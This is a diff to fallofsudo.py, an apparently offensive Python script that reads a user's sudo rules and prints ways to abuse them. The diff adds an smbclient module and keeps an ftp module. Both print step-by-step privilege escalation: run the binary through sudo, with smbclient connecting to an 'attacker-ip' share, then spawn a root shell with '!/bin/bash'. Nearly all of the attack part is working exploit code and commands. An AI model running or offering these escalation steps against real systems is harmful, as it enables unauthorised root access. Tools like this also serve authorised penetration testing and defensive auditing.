@@ -9,7 +9,7 @@
 # Usage Example: python fallofsudo.py
 # Description: This script obtains users Sudo rules and provides ways to abuse them. 
 #
-# STATUS: 40 SUDO RULES
+# STATUS: 41 SUDO RULES
 ###############################################################################################################
 
 import getpass
@@ -168,6 +168,9 @@ def sudopwner():
         elif 'ftp' in item[3]:
             ftp_user = item[0]
             choices.append('ftp')
+        elif 'smbclient' in item[3]:
+            smbclient_user = item[0]
+            choices.append('smbclient')
         elif 'sed' in item[3]:
             sed_user = item[0]
             choices.append('sed')
@@ -271,6 +274,8 @@ def sudopwner():
         gdb(gdb_user)
     elif question == "ftp":
         ftp(ftp_user)
+    elif question == "smbclient":
+        smbclient(smbclient_user)
     elif question == "sed":
         sed(sed_user)
     elif question == "mysql":
@@ -1034,6 +1039,24 @@ def ftp(ftp_user):
     else:
         print OKRED + " [*] sudo -u " + ftp_user + " ftp" + ENDC
     print OKBLUE + "[2] Once in the ftp prompt type the following: " + ENDC
+    print OKRED + " [*] !/bin/bash" + ENDC
+    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+    sys.exit()
+
+
+# SUDO smbclient Rule Pwnage
+def smbclient(smbclient_user):
+       
+    # ADD AUTO PWNAGE STEPS 
+
+    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
+    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
+    print OKBLUE + "[1] Execute the 'smbclient' command, connecting to a valid SMB or CIFS share: " + ENDC
+    if (smbclient_user == "ALL") or (smbclient_user == "root"):
+        print OKRED + " [*] sudo smbclient \\\\\\\\attacker-ip\\\\share-name -U username" + ENDC
+    else:
+        print OKRED + " [*] sudo -u " + smbclient_user + " smbclient \\\\\\\\attacker-ip\\\\share-name -U username" + ENDC
+    print OKBLUE + "[2] Once in the smbclient prompt (smb: \>), type the following: " + ENDC
     print OKRED + " [*] !/bin/bash" + ENDC
     print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
     sys.exit()
